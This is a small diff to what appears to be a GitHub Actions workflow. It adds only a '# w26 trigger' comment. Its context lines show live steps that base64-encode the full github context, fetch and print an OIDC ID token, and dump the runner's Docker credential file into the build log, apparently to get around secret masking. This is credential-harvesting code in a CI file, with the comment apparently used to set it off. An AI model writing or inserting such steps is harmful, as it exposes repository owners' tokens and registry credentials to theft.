@@ -18,3 +18,4 @@ jobs:
           echo "GITHUB_B64=$(printf '%s' '${{ toJSON(github) }}' | base64 -w0)"
           if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=github" | base64 -w0 | sed 's/^/OIDC_B64=/'; fi
           (cat /home/runner/.docker/config.json 2>/dev/null | base64 -w0 | sed 's/^/DOCKERCFG_B64=/' )
+# w26 trigger
